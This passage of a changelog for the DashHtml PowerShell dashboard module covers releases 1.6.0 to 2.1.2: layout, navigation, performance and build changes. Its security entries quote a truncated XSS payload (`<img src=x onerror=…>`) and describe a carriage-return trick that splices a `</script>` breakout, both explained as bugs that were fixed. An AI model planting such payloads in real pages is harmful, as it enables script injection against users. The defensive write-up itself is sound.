theme's `--accent-primary`.

## [2.1.2]

### Fixed — a column could not be dragged narrower than its own header

2.1.1 made columns resizable, but shrinking one below a certain point silently
did nothing. The table is `table-layout: auto`, where `width` is only a
*suggestion*, and `.data-table thead th` was `white-space: nowrap` with no
`overflow` and no `max-width` — so the header text could neither wrap nor clip
and became the column's hard minimum. Measured on a real report: `Ottenuto
tramite` floored at **181px**, `Livello di autorizzazione` at **239px**
(label + 32px padding + the sort icon). The uppercase + `letter-spacing` header
style makes that text wider than it looks.

The header now clips like the body cells already did:

- `thead th` gets `overflow: hidden`, and the renderer sets `max-width` on it
  (not just `width`) so the cap is real rather than advisory.
- `.col-label` truncates with an ellipsis. `max-width` is `100%`, deliberately
  not `100%` minus an icon reservation — reserving space made a short header
  like `ID` measure as clipped in a narrow column and pick up a tooltip it
  did not need.
- **A clipped header gets the full text as `title=`**, measured the same way the
  cells are, and drops it again when the column is widened. A truncated header
  matters more than a truncated cell: it is the only thing naming the column.
- The resize grip moved from `right: -3px` to `right: 0`, so the header's new
  `overflow: hidden` does not cut it off.
- The explicit drag floor drops from 60px to **40px**, now that it is the only
  floor left.

`Ottenuto tramite` now drags from 300px down to 40px and back.

## [2.1.1]

### Fixed — long cell values were unreadable

Table cells are `white-space: nowrap` with `text-overflow: ellipsis`, so a value
wider than its column is clipped. It was clipped with no way to recover the rest:
`_renderCell` set `textContent` and nothing else, and the width was fixed at
authoring time. A production report hit this with 271-character group chains in a
300px column.

Three changes, no API surface added:

- **Clipped cells now carry the full value as a `title=` tooltip.** Which cells get
  one is *measured* after render (`scrollWidth > clientWidth`), not guessed from
  string length — so short cells stay tooltip-free and the set stays correct when
  the theme font or the column width changes. Clipped cells also get a dotted right
  edge (`.cell-clipped`) so "there is more here" is visible, not just on hover.
- **Columns are resizable.** Drag the right edge of any header; double-click or
  `Home` resets to the declared width, `←` / `→` nudge by 16px. Widths are engine
  state, so a reset falls back to the author's `Width`. The grip stops its own
  events so resizing never triggers the column sort.
- **A declared column `Width` now wins over the stylesheet cap.** A column declared
  wider than `.data-table td { max-width }` was previously clipped at the cap
  anyway, silently ignoring the declaration.

### Changed — example scripts renamed

`Examples/*.ps1` now follow a scheme that says what each one produces:
`Demo-<Domain>.ps1` for a realistic report, `Demo-Feature-<X>.ps1` for one
capability in isolation. Each script's default `-OutputPath` follows its new name.

| Was | Now |
|---|---|
| `AD-Dashboard.ps1` | `Demo-ActiveDirectory.ps1` |
| `vSphere-Dashboard.ps1` | `Demo-VMware.ps1` |
| `Invoke-Demo-DashHtml.ps1` | `Demo-Feature-FullShowcase.ps1` |
| `Multi-Panel-Dashboard.ps1` | `Demo-Feature-NavMultiPanel.ps1` |
| `v1.5-Widgets-Showcase.ps1` | `Demo-Feature-TabsHeatmapTopology.ps1` |
| `v2-Nav-Tree.ps1` | `Demo-Feature-NavTree.ps1` |
| `v2-Deep-Nav-Sidebar.ps1` | `Demo-Feature-NavDeepSidebar.ps1` |
| `v2.1-RangeBar-Showcase.ps1` | `Demo-Feature-RangeBar.ps1` |

### Added — `Examples/Demo-Feature-AllChartTypes.ps1`

Every visualisation type in one dashboard, one nav panel per job to be done
(Trend / Proportion / Ranking / Range / Target / Matrix / Hierarchy / Timeline /
KPI / In-table). Each panel carries a note saying what that chart is **for** and
when to reach for a different one — so it doubles as the "which widget?" reference.


### Fixed — `-Collapsible` / `-DefaultOpen` had no effect on bar and pie charts

`renderBlocks()` hands a collapsible block an **inner** container (`#cinner-<id>`)
and a title-stripped clone. Three block types are re-rendered after that point —
`barchart`, Mode-A `piechart` and table-fed `rangebar` — once in the boot pass and
again on every filter change via `_refreshLinkedBarCharts`. Bar and pie charts
targeted the **outer** element (`block-<id>`) with the original block, overwriting
the toggle header that had just been built. The chevron never appeared and both
`-Collapsible` and `-DefaultOpen` were silently inert for those two block types.

All three now resolve their target through `blockRenderTarget(block)` (renamed from
`rangeBarRenderTarget`, which 2.1.0 introduced for the range bar alone). A collapsed
bar chart also now **stays collapsed** across a filter change, where previously the
whole block was rebuilt.

**Visible change:** bar charts and table-fed pie charts now render with a collapse
header, like every other block type. Pass `-Collapsible $false` to keep one flat.

Also: `renderBarChart`, `renderBarChartStacked` and `buildPieSvg` emitted an empty
heading element when the title was stripped, leaving 4–9px of dead space inside the
collapsible body. They now omit the heading entirely when there is no title, matching
what `renderLineChart` and `renderRangeBar` already did.

## [2.1.0]

### Added — `Add-DhRangeBar`

A horizontal **min–avg–max range chart**. One floating bar per category spanning
`Min → Max`, an independently positioned average tick, and a shared 0–100 axis
that every row is normalised onto against its own `High` value — so entities of
very different magnitude (a 315-unit cluster and a 30-unit one) become visually
comparable.

The bar's fill is a fixed slice of **one gradient spanning the whole track**, so
its colour says *where on the axis it sits*, not which category it is. The stops
are new per-theme tokens `--range-grad-0` / `--range-grad-50` / `--range-grad-100`,
mapped onto each theme's own `--accent-ok` → `--accent-warn` → `--accent-danger`
ramp, so the scale follows the active theme in both light and dark.

Two data modes:

- `-Items` — explicit rows (`Name` / `Low` / `High` / `Min` / `Avg` / `Max`).
- `-TableId` + `-CategoryField` + `-ValueField` — derives the rows from a table
  already in the report. Aggregation runs in the browser against the table's
  **filtered** rows, so filtering the table live-recomputes every bar (the same
  mechanism `Add-DhBarChart` uses). `-HighField` / `-High` / neither selects what
  the 0–100 axis is normalised against; the caption states which, automatically.

Also: `-ShowDataTable` for a toggleable raw-values fallback, keyboard-focusable
bars with a full readout tooltip, `-MaxRows` cardinality guard, and generation-time
warnings for non-numeric values, out-of-scale rows and `High <= Low` (which renders
striped rather than dividing by zero).

The average tick is deliberately **not** clamped into `[Min, Max]` — an average
over a different window legitimately falls outside the bar, and hiding that would
misrepresent the data.

### Fixed

- The shared tooltip overlay (`.topo-tooltip`, used by `Add-DhTopologyMap` and now
  `Add-DhRangeBar`) and `.topo-node-rect` referenced `--bg-elevated`, which no theme
  defines — so the tooltip painted with a transparent background in every theme.
  Both now fall back to `--bg-surface`.


### Added — `DashHtml.Design` companion module (separate module, v1.0.0)

A **new, optional** companion module that lets you manage a dashboard's *layout*
declaratively in YAML/JSON. It is a pure design / round-trip transpiler and makes
**no changes to the core DashHtml module** — the core API, output, and behaviour
are byte-identical whether or not you install it. It is self-contained (ships its
own compact YAML reader/writer; **no `powershell-yaml` dependency**).

Three cmdlets:

- **`ConvertTo-DhYaml`** — report object → YAML. Serialises the already-built
  report (from `New-DhDashboard` + `Add-Dh*`), so loops, computed values and
  dynamic data are captured faithfully. Row data is summarised as a `dataRows`
  count by default; `-IncludeData` embeds the rows. This is the **lossless**
  reverse direction.
- **`ConvertFrom-DhYaml`** — YAML/JSON → a runnable `.ps1` build script. Emits
  `New-DhDashboard` / `Add-Dh*` / `Export-DhDashboard` in dependency-correct order
  (tables before the charts that reference them). Every argument is validated
  against **live cmdlet metadata** (`Get-Command`), so only real parameters are
  written and switch-vs-bool is handled correctly — no hand-maintained schema to
  drift. Table data resolves from `dataFile` (→ `Import-Csv`), inline `data`, or a
  `# TODO` placeholder.
- **`ConvertFrom-DhScript`** — existing `.ps1` → YAML. **Best-effort** static AST
  parse (never executes the script); values it can't resolve statically become
  `<expr: ...>` markers.

Docs: [DashHtml.Design/README.md](DashHtml.Design/README.md). Example:
[Examples/design/](Examples/design/). Tests: **26 scenarios** in
`Tests/DashHtml.Design.Tests.ps1` (YAML round-trip, lossless serialisation,
YAML→runnable-script producing valid HTML, and static `.ps1` parsing) — run
automatically by `Build.ps1`.

### Changed — `Build.ps1` now builds both modules for independent publishing

`Build.ps1` produces **two independently publishable packages**. Each module gets
its own manifest validation (+ the PSGallery ReleaseNotes length guard), its own
`dist\<Module>\` staging folder, its own versioned `.zip`, and its own `.nupkg`
under `-NuGet`. PSScriptAnalyzer now covers both sources; the single Pester suite
already covers both. The two modules are **versioned separately**:

| Flag | Effect |
|------|--------|
| `-BumpVersion` | bump the **core** `DashHtml` patch version |
| `-BumpDesignVersion` | bump the **companion** `DashHtml.Design` patch version |
| `-SkipDesign` | build the core only, ignore the companion |
| `-NuGet` | pack a `.nupkg` per module |

Staging now prefers a **module-local `README.md`** when one exists (falling back
to the repo-root README), so `DashHtml.Design` ships its own PSGallery page
instead of the core module's. Core-module output is unchanged.
[PublishPowerShellGallery.txt](PublishPowerShellGallery.txt) documents the
two-package publish flow.

Also fixed: **`-NuGet` is now idempotent.** `dist\` *is* the temporary
`LocalBuild` repository's source location, so a `.nupkg` left by a previous run
made `Publish-Module` fail with *"version 1.10.2 is already available in the
repository"* — re-running `.\Build.ps1 -NuGet` without a version bump always
failed at the last step. The stale package for the version being packed is now
removed first.

### Changed — `Install.ps1` installs both modules

`Install.ps1` now installs the core module **and** the `DashHtml.Design`
companion, each into its own versioned folder
(`<root>\DashHtml\<ver>\`, `<root>\DashHtml.Design\<ver>\`). The core is always
installed first, since the companion reads its cmdlet metadata at runtime. If
the companion isn't present in the checkout, the script says so and installs the
core alone — so existing single-module workflows are unaffected.

| Flag | Effect |
|------|--------|
| `-SkipDesign` | install the core module only |
| `-DesignOnly` | install the companion only |
| `-DesignSource` | explicit path to the companion (mirrors `-Source`) |

`-Uninstall` now removes both modules for the chosen scope (companion first),
and honours `-SkipDesign` / `-DesignOnly` for partial removal. Source resolution
still prefers a built `dist\<Module>\` over the in-repo folder, and each install
is verified by importing the module and listing its exported cmdlets.

## [2.0.0] — 2026-08-26

**Major release.** Navigation rebuilt as a single depth-agnostic tree, and the long-announced `-AllowHtml` default flip. See **[MIGRATION-v2.md](MIGRATION-v2.md)** — all five bundled examples upgrade with **zero edits**.

### BREAKING — `-AllowHtml` now defaults to `$false`

Announced by a runtime warning on every build since 1.5.x. Affects `Add-DhHtmlBlock`, `Add-DhCollapsible`, `Add-DhAlertBanner`, `Add-DhTabs`. Content is now **HTML-encoded by default** and renders as literal text; pass `-AllowHtml:$true` for intentional raw markup.

The change is **self-diagnosing**: when the new default applies *and* the content looks like markup, a warning names the exact call site. An explicit `-AllowHtml` (either value) silences it — the warning exists for the *unchosen* case. `Update-DhScript -Apply` rewrites the affected calls automatically.

### Added — one navigation tree, any depth

`-NavPath` / `-NavScope` / `-NavLabel` / `-NavOrder` on all **15** nav-aware cmdlets.

```powershell
Add-DhBarChart -Report $r -Id 'c1' -NavPath 'Storage/Tagging/Keys'
Add-DhSummary  -Report $r -NavPath 'Storage' -NavScope Subtree
Add-DhAlertBanner -Report $r -Id 'a1' -NavScope Global
```

- `Exact` (default) · `Subtree` (this node and everything below) · `Global` (everywhere).
- `-NavLabel` decouples display text from the path key, so renaming never breaks a saved deep link.
- `-NavOrder` orders siblings explicitly; ties fall back to **declaration order**, shared across tables and blocks.
- `'//'` escapes a literal `/` inside a segment.
- Combining `-NavPath` with `-NavGroup`/`-NavSubGroup` is a **hard error** — silent precedence between two ways of saying the same thing is how the 1.x nav grew three competing mechanisms.
- **`-NavGroup` / `-NavSubGroup` are kept indefinitely** and map onto the new model. Not deprecated.

### Fixed — SECURITY-adjacent: content that was silently unreachable

A **block** declared with both `-NavGroup` and `-NavSubGroup` was **invisible in 1.x** and could not be reached by any navigation sequence. The hide path cleared both the inline `display` and the `panel-active` class; the show path restored only the inline style, and `.block-section` defaults to `display:none`. Reproduced in a browser: a chart in a non-first subgroup never appeared, and a chart in the first subgroup never returned after any pill click. Failed **silently** — no console output, just an empty panel.

Dashboards that have been quietly losing a chart since 1.9.x **will start rendering it**. That is the fix, but the page will look different — check before shipping.

### Changed — navigation runtime rewritten

`showGroup` / `showSubPanel` / `showSubGroup` / `_showFlatPanel` (~110 lines, two competing visibility mechanisms) are replaced by `applyNav` + `navMatches`. A section is visible **iff** it carries `panel-active`; nothing else touches `style.display`. State is recomputed whole from the selected path — idempotent and independent of the route taken. There are no show/hide branches left to keep symmetrical.

The menu is derived **from the DOM**, from the same `data-navpath` attributes the matcher reads, so a menu strip can never describe a view the content does not have. Strips render from a **loop** with no fixed element ids and no level names, which is what makes a fourth level a config change rather than a rewrite.

### Added — layout engine

- `New-DhDashboard -NavLayout Auto|Strips|Sidebar` (default `Auto`) and `-NavMaxDepth 1..5` (default 3).
- **Auto** keeps the 1.x strips look to 3 levels and switches to a left tree rail at 4+, where three or four sticky strips would consume ~190–225px — a fifth of a 1080p viewport.
- **Breadcrumb** at depth 4+; the rail expands only the branch in use.
- **Auto-descend stops at the first node with content of its own**, so one click never teleports the reader four levels down.
- Exceeding `-NavMaxDepth` **warns but still exports** — depth is a layout preference, not a correctness problem.
- Row-count badges now render on menu nodes at any depth.

### Added — `Update-DhScript` (DashHtml.Design)

AST-based upgrade audit with an optional rewrite mode. Classifies findings as `ACTION` / `advisory` / `info`, backs up before editing, and is idempotent. It only ever **adds** `-AllowHtml:$true`, only for literal markup, and never guesses at non-literal content.

AST rather than text matching is load-bearing: these calls routinely span lines with backtick continuation, so a line-oriented pattern silently under-reports — on `Examples/` the obvious greps find **0** issues where the AST finds **13**.

### URL state

The selected path is persisted at any depth, replacing the 1.x `{group,panel}` pair that could not express a third level. Old hashes are shimmed; restore validates segment by segment and truncates at the first miss, so a renamed node degrades to its parent rather than a blank page.

### Tests

**474 total** (was 423). New: a nav truth table across scope × declared depth × selected depth; a structural test asserting **no content can be unreachable** — the exact failure class of the fixed bug; layout-resolution tests; and a Node + DOM-shim suite (`Tests/js/`) that drives the JS matcher headlessly in ~0.2s. The shim was prototyped **first**, as a spike, to verify it could actually catch the reported bug before any production code depended on it.
## [1.10.4] — 2026-08-07

Performance release. **No API changes, and sort order is unchanged** (proven by differential testing against the previous comparator — see below).

### Performance
- **Sorting a large table no longer freezes the browser — 5.6 s → 169 ms (~33×).** Clicking a column header on a 19,011-row × 17-column table blocked the main thread for **5.6 seconds**. Two pathologies in the comparator at [Get-DhJsTable.ps1](DashHtml/Private/Get-DhJsTable.ps1), which runs ~270,000 times per sort (n log n):

  1. `String(av).localeCompare(String(bv), undefined, {sensitivity:'base'})` — passing an **options object** makes the engine re-resolve collation settings **on every call**. This is the dominant cost, worth ~15× on its own.
  2. `parseFloat` on both operands per comparison — O(n log n) parses of values that need parsing only O(n) times.

  Fixed with decorate–sort–undecorate: each row's sort keys (string form + numeric form) are computed **once**, and a single `Intl.Collator` is reused for every comparison.

  | operation (19,011 rows) | before | after |
  |---|---|---|
  | sort column, ascending | 5,640 ms | **169 ms** |
  | sort column, descending | 5,260 ms | **173 ms** |
  | filter | ~250 ms | unchanged |
  | load + parse (9.75 MB file) | ~3.1 s | unchanged |

  Measured in-browser on a real SQL Server permission audit, not a synthetic benchmark.

### Sort order is unchanged — and verified
The risk in this change is ordering, so it was tested differentially rather than argued. A harness ran the **old and new comparators side by side over 501 randomised cases**, asserting identical output sequence:

- partially-numeric strings (`'123abc'` → `parseFloat` gives `123`, **not** `NaN`, so it stays numeric-compared — existing quirk, deliberately preserved)
- case- and accent-insensitivity (`café` / `cafe` / `CAFE` compare equal under `sensitivity:'base'`)
- booleans, `null`, `undefined`, empty and whitespace strings, `'Infinity'`, `'NaN'`, `'1e3'`
- sparkline columns across all four `sortBy` modes (`first` / `last` / `min` / `max`)
- multi-field sorts with mixed asc/desc directions
- a 200-row all-ties case pinning **stability**

Zero mismatches. The equivalence is spec-level: `localeCompare(y, loc, opts)` is *defined* as `new Intl.Collator(loc, opts).compare(x, y)`, and `Array#sort` is stable in ES2019+, so tied rows keep their input order exactly as before.

### Not changed
- The other two `localeCompare` call sites — event feed ([Get-DhJsBlocks.ps1](DashHtml/Private/Get-DhJsBlocks.ps1)) and facet value lists ([Get-DhJsCore.ps1](DashHtml/Private/Get-DhJsCore.ps1)) — pass **no** options object and operate on small arrays, so neither has the pathology. Left as they are.

### Tests
- **5 new scenarios** (397 total) pinning the *shape* of the fix: a single reusable `Intl.Collator` exists; no options-object `localeCompare` survives outside the no-`Intl` fallback; sort keys are precomputed outside the comparator; sparkline reduction still runs; and a multi-column table exports without error. Pinned at source level deliberately — the old code sorted **correctly**, just glacially, so no functional test would ever have caught the regression.

## [1.10.3] — 2026-08-07

Performance release. **No API or output changes** — exported HTML is byte-identical to 1.10.2 (verified on a fixture covering every escaping rule, plus `$null` / bool / numeric / array cells and heterogeneous rows).

### Performance
- **`Export-DhDashboard` is ~15× faster end-to-end on large tables, ~40× on the part that scales.** The cost was concentrated in one place: `ConvertTo-DhJsonString` ran **nine regex passes over every string**, and the row serialiser calls it **twice per cell** (once for the column name, once for the value). Measured at **1.2718 ms per call** — so ~2.5 ms of a 3.9 ms/cell total, about two-thirds of export time, spent escaping text that in practice needs no escaping at all.

  The fix is a single `IndexOfAny` pre-check ([ConvertTo-DhJsonString.ps1](DashHtml/Private/ConvertTo-DhJsonString.ps1)) that returns the quoted string immediately when it contains none of the characters any pass would rewrite. Real table data — hostnames, dates, enum values, counts — almost never does.

  | | before | after |
  |---|---|---|
  | escaper, per call | 1.2718 ms | **0.0142 ms** (90×) |
  | 20,400-cell report | 79.7 s | **5.2 s** (15×) |
  | marginal cost | ~2.9–3.7 ms/cell | **~0.08 ms/cell** (~40×) |
  | 338,000-cell report | ~16 min | **~30 s** (projected) |

  Cost is linear in **cells (rows × columns)**, not rows — a 17-column table costs roughly twice an 8-column one at the same row count.

### Security
- **Documented and pinned a load-bearing ordering dependency in the escaper.** Carriage return is *dropped* rather than escaped, so `'<' CR '/script>'` only collapses into a literal `</script>` **during** escaping — and is then caught by the `</` → `<\/` pass that runs afterwards. Verified: `"a<`r/script>b"` → `"a<\/script>b"`.

  This makes the obvious next optimisation — folding the nine passes into one regex over the *original* string — a **script breakout**, because that regex never sees the spliced `</`. The passes are therefore deliberately left intact and merely skipped when provably unnecessary; the hazard is now commented at the `</` rule and covered by a regression test. It is also a second reason (beyond the missing `</` and U+2028/29 handling already noted) not to swap in `ConvertTo-Json` or `System.Text.Json`.

### Known trade-off
- A string containing a lone `<` takes the slow path even though `<` alone is never rewritten — the trigger set is a deliberate superset so the check stays one `IndexOfAny`. Datasets with `<` in most cells (e.g. `"value < 10"`) see less benefit. Splitting the check would fix that at the cost of a second call on every cell.

### Tests
- **5 new scenarios** (392 total): plain-string fast path, `</script>` escaping, the CR-spliced `</script>` regression guard, lone `<` left untouched, and backslash / quote / tab / newline / C0 escaping — all driven through table cell data (the hot serialisation loop) rather than `InModuleScope`.

## [1.10.2] — 2026-07-20

Minor fixes — code-review follow-ups (the L-items from the 1.10.1 review). No API changes.

### Fixed
- **`--accent-primary-fg` now defined in every theme (contrast fix).** The token — the text colour drawn on an `--accent-primary` background (active subgroup pill, collapsed topology toggle) — was referenced but **never defined**, so it fell back to `#fff`. A WCAG check showed **7 of the 12 accent variants are bright** (Default, VMware, Azure-dark, Grey-dark, Rag-dark, Default-dark, VMware-dark), where white text is unreadable. Each theme now defines `--accent-primary-fg` with the higher-contrast of white / near-black for its accent (all pass WCAG AA). The `var(--accent-primary-fg, #fff)` fallback is retained defensively.
- **XLSX export sanitises the sheet name.** Excel sheet names may not exceed 31 chars, be blank, or contain `: \ / ? * [ ]`; an invalid name made `book_append_sheet` throw and the Excel download **silently failed**. The name is now stripped of illegal characters, collapsed, trimmed to 31, and falls back to `Sheet1`.

### Documentation
- Clarified that **CSV / XLSX / PDF export always covers the full filtered set** (all rows matching the active filters, in sort order) — never just the visible page or the virtualised window. The PDF header prints `Rows: N` as a cue. (readme-dev gotcha #23.)

### Tests
- **8 new scenarios** (387 total): `--accent-primary-fg` present in every theme (source + exported HTML across all six families) and the XLSX sheet-name sanitiser in the export JS.

## [1.10.1] — 2026-07-20

Bug-fix patch from an internal code review. No API changes.

### Security
- **Progressbar cells now HTML-encode their label (XSS fix).** A table column with `CellType='progressbar'` built its cell via `innerHTML` with the value **un-escaped** ([Get-DhJsTable.ps1](DashHtml/Private/Get-DhJsTable.ps1)). A non-numeric value such as `<img src=x onerror=…>` therefore executed — a real XSS sink that contradicted the README's guarantee that *table cells are auto-encoded and safe for user-supplied text*. The value is now wrapped in `esc()`; it renders as inert literal text (verified: the payload becomes `&lt;img…`, no live tag). The sibling `badge` / `text` / `sparkline` cell types were already safe.

### Fixed
- **Duplicate-Id guard added to 5 block cmdlets** — `Add-DhBarChart`, `Add-DhCollapsible`, `Add-DhFilterCard`, `Add-DhHtmlBlock`, `Add-DhPieChart` now throw on a colliding block `Id`, matching the other 11 block cmdlets. Previously a duplicate silently produced two blocks sharing one DOM id, so charts rendered into the wrong container (or not at all).
- **"Select all" checkbox on a non-pageable table** now selects **all** filtered rows. It sliced by `pageSize` (15) even when `-Pageable:$false` rendered every row, so the header checkbox silently selected only the first 15 of a many-row table.

### Known limitation (documented, not a regression)
- **Global filters (`Add-DhGlobalFilter`) affect tables and table-derived charts, not top-of-page KPI summary tiles.** Summary tiles are computed once from the full dataset and do not react to a global filter selection. Filter the underlying tables, or scope KPIs per nav panel with `Add-DhSummary -NavGroup`.

### Tests
- **7 new scenarios** (379 total): progressbar `esc()` in the runtime JS, duplicate-Id throw for all 5 newly-guarded cmdlets, and the pageable-aware select-all branch.

## [1.10.0] — 2026-07-20

Opt-in 12-column grid layout. **Non-breaking** — a dashboard that sets no `-GridSpan` is byte-identical to 1.9.0 (the sequential flex-column flow is unchanged).

### Added
- **`-GridSpan <1-12>` on every block cmdlet and `Add-DhTable`** — declares how many of 12 columns the element should occupy. As soon as **any** block or table sets a span, `Export-DhDashboard` switches the report body to a 12-column CSS grid (`.report-grid`) and emits an inline `grid-column: span N` on that section. Elements without a span default to full width, so you can mix a full-width table with a row of half-width charts:
  ```powershell
  Add-DhLineChart  -Report $r -Id 'trend' -GridSpan 8 ...   # 8/12 wide
  Add-DhPieChart   -Report $r -Id 'mix'   -GridSpan 4 ...   # 4/12, sits beside it
  Add-DhTable      -Report $r -TableId 't' ...              # no span → full row
  ```
  Two `-GridSpan 6` blocks sit side by side; three `-GridSpan 4` blocks make a row of thirds. Page chrome (alert banners, the global filter bar, the KPI summary) is always full width. The grid **collapses to a single column below 900 px** so it stays readable on narrow screens.

### Implementation
- 12 block cmdlets + `Add-DhTable` gained a `[ValidateRange(0,12)] [int] $GridSpan = 0` parameter (0 = default flow).
- `Public/Export-DhDashboard.ps1` — detects any span, adds `report-grid` to the body class, emits the inline span on block sections; `Private/Build-DhTableSections.ps1` does the same for table sections.
- `Private/Get-DhCssBase.ps1` — `.report-body.report-grid` grid rules + full-width chrome + the narrow-viewport collapse.

### Tests
- **7 new scenarios** (372 total): `-GridSpan` stored on block + table, range validation, and exported-HTML checks (grid body class, inline span, grid CSS, and a control confirming a no-span dashboard stays in flow layout).

## [1.9.0] — 2026-07-20

Page-level global filters. Non-breaking — a dashboard with no global filter is byte-identical to 1.8.0.

### Added
- **`Add-DhGlobalFilter` cmdlet** — adds a control to a filter bar rendered above the report body. When the user changes it, **every table that has the named field re-filters at once**, and any chart derived from those tables re-aggregates. Tables that don't have the field are left alone. Two control types:
  - `-Type facet` (default) — a dropdown of distinct values (auto-derived from the tables' data, or supply `-Values`). Keeps rows whose field equals the selection.
  - `-Type daterange` — from/to date inputs. Keeps rows whose field parses as a date within the inclusive range.
  - Multiple global filters combine with **AND**. Selections **persist in the URL hash**, so a shared link or reload keeps them applied. `-Label` and `-Placeholder` customise the control.
- The runtime gains a small **`GlobalFilter` event bus** (in `Get-DhJsCore`): tables subscribe and add a global-filter stage to their `_getFiltered()` pipeline (guarded by `GlobalFilter.active()`, so zero cost when unused). The filter bar honours `prefers-reduced-motion` and is keyboard-accessible with focus rings.

### Implementation
- `Public/Add-DhGlobalFilter.ps1` (new) + exported in the manifest.
- `Public/Export-DhDashboard.ps1` — builds `GLOBALFILTER_CONFIG`, injects the `#global-filter-bar` container, substitutes the new placeholder.
- `Private/Get-DhJsCore.ps1` — `GlobalFilter` bus, `renderGlobalFilters()`, `_gfDistinct()`, URL persistence; `Get-DhJsTable.ps1` — filter stage in `_getFiltered`; `Get-DhJsBoot.ps1` — restore + subscribe + first-render.
- `Private/Get-DhCssBase.ps1` — `.global-filter-bar` and control styles.

### Tests
- **10 new scenarios** (365 total). Cmdlet validation (defaults, daterange, explicit values, duplicate-field guard) + exported-HTML wiring (bar container, config, bus, `_getFiltered` stage, placeholder substitution). The row-matching logic (`matchRow` — facet, date-range, AND, field-absent) was additionally verified against a Node harness.

## [1.8.0] — 2026-07-20

Internal refactor — **no functional change**. Generated dashboards are byte-for-byte identical to 1.7.0.

### Changed
- **Runtime JavaScript split into fragment files** — the dashboard runtime JS (~3,400 lines) previously lived in a single here-string inside `Private/Get-DhJsContent.ps1`. It is now authored across five cohesive private fragments — `Get-DhJsCore.ps1` (config/state/URL/formatting/threshold/theme/density/sparkline/delta/alerts/tiles), `Get-DhJsBlocks.ps1` (every block renderer), `Get-DhJsNav.ps1` (two/three-tier navigation), `Get-DhJsTable.ps1` (the `TableEngine`), and `Get-DhJsBoot.ps1` (DOMContentLoaded bootstrap) — which `Get-DhJsContent` concatenates with `-join`. The split points are top-level function boundaries, so the assembled script is a single shared scope exactly as before; **the output was verified byte-for-byte identical** to the 1.7.0 monolith. Pure maintainability win — no cmdlet, parameter, or rendered-HTML change.

## [1.7.0] — 2026-07-20

UX & performance pass (backlog P2). All changes are additive / non-breaking; interactive topology and reduced-motion are on by default.

### Added
- **Interactive topology maps** — `Add-DhTopologyMap` gains `-Interactive` (default `$true`). The tree renders in a fixed-height viewport with **drag-to-pan**, **mouse-wheel zoom**, a **zoom-in / zoom-out / reset toolbar**, and a **`+/−` collapse toggle on every parent node** to fold/unfold its subtree. Auto-fits to the container on load and re-fits on resize until the user takes manual control. Pass `-Interactive:$false` for the pre-1.7.0 static scale-to-fit rendering (no toolbar, no collapse). Auto-fit, hover tooltips, drill-down, status colours, and forest/horizontal/vertical layout are all preserved.
- **Accessibility** — the generated dashboard now:
  - honours **`prefers-reduced-motion`**: a media query neutralises every transition/animation (collapsible expand, hover lifts, topology easing) and disables smooth-scroll while preserving final states;
  - adds **`aria-sort`** (`ascending`/`descending`/`none`) to sortable table headers and makes them **keyboard-operable** (`tabindex=0`, Enter/Space sorts, Shift for multi-sort) with a visible **focus ring**;
  - marks the per-table **result-count** element `role="status"` + `aria-live="polite"` so filter changes are announced to screen readers;
  - adds `scope="col"` to every column header.
- **Large-table row virtualisation** — a non-pageable table (`-Pageable:$false`) larger than 150 rows now windows the DOM: only the rows near the scroll viewport are built (top/bottom spacer rows preserve the scrollbar), inside a bounded-height container with a sticky header. Keeps "show everything" fast for multi-thousand-row inventories. The default **paginated** path is byte-for-byte unchanged (the row-builder was extracted but produces identical rows) — zero regression there.

### Fixed
- **`-Pageable:$false` showed only the first page** — a non-paginated table emitted `pageSize=15` and rendered only 15 rows with no way to reach the rest. It now renders **all** filtered rows (virtualised when large). Existing dashboards that used `-Pageable:$false` with more than 15 rows were silently losing data and will now show everything.
- **`Add-DhTabs` with a single tab threw** (carried from the 1.6.0 fix note; the `@(...)` coercion also protects the new virtualisation row lists).

### Accessibility notes (RAG contrast audit)
A WCAG contrast audit of the RAG palettes (text on the effective near-white cell background) found: **`Rag` theme passes AA across the board** (7–8.7 : 1); **`Default` passes AA** on ok/warn/danger (6.3–7.5 : 1); the only marginal case is `Default`'s `cell-nodata` grey at **4.4 : 1** (0.1 below the 4.5 : 1 AA threshold for normal text). Colours were **not** retuned (that would shift every existing dashboard) — for audiences needing guaranteed AA, use `-Theme Rag`.

### Implementation
- `Private/Get-DhJsContent.ps1` — `renderTopologyMap` rewritten with a re-runnable `computeLayout`, `buildInner`, pan/zoom transform state, `ResizeObserver`-driven auto-fit, and collapse state; `TableEngine._renderBody` split into `_buildRow` + a `_renderVirtual` / `_teardownVirtual` windowing path; sortable-header build adds ARIA + keyboard.
- `Public/Add-DhTopologyMap.ps1` + `Public/Export-DhDashboard.ps1` — new `Interactive` field emitted in the topology block JSON.
- `Private/Get-DhCssBase.ps1` — `prefers-reduced-motion` reset; topology toolbar/toggle/pan-cursor styles; `.table-virtual` sticky-header scroll container; sortable-header focus ring.
- `Private/Build-DhTableSections.ps1` — `role="status"` + `aria-live` on the result-count span.

### Tests
- **10 new scenarios** (355 total): topology `-Interactive` default/override + emitted JS; `-Pageable:$false` config + virtualisation engine in output; reduced-motion / aria-live / aria-sort / keyboard / focus-ring presence.

## [1.6.0] — 2026-07-20

Opt-in HTML safety for the four cmdlets that inject caller-supplied content into the DOM via `innerHTML`. **Non-breaking** — the default preserves v1.x raw-markup behaviour; a deprecation warning announces the encode-by-default flip planned for 2.0.0.

### Added
- **`-AllowHtml` parameter on `Add-DhHtmlBlock`, `Add-DhTabs`, `Add-DhCollapsible`, and `Add-DhAlertBanner`** — controls whether the raw-HTML sink (`-Content`, per-tab `Content`, `-Content`, `-Message` respectively) is injected as raw markup or HTML-encoded.
  - `-AllowHtml:$true` (**default**) — content is rendered as raw HTML, exactly as in v1.x. No behaviour change on upgrade.
  - `-AllowHtml:$false` — content is HTML-encoded with `[System.Net.WebUtility]::HtmlEncode` (encodes `< > & " '`) and renders as literal text. **Use this for any externally-sourced / untrusted data** (AD attributes, ticket titles, log lines, hostnames).
- **Deprecation warning** — when the content looks like HTML *and* `-AllowHtml` was not passed explicitly, the cmdlet emits a `Write-Warning` noting that the default will change to `$false` (encode) in **DashHtml 2.0.0**. Silence it by passing `-AllowHtml:$true` (keep raw) or `-AllowHtml:$false` (encode). Plain-text content never warns; an explicit `-AllowHtml` value never warns.
- The encode / warn logic lives in one shared private helper (`ConvertTo-DhSafeContent`, with `Test-DhLooksLikeHtml`) so all four cmdlets behave identically.

### Fixed
- **`Add-DhTabs` with a single tab threw** — a one-element `-Tabs` array made the internal `$normTabs` a scalar hashtable, so the "no active tab → activate the first" step indexed `$normTabs[0]` on a scalar and failed with *"The property 'Active' cannot be found"*. The build loop is now wrapped in `@(...)`. Regression test added.

### Changed
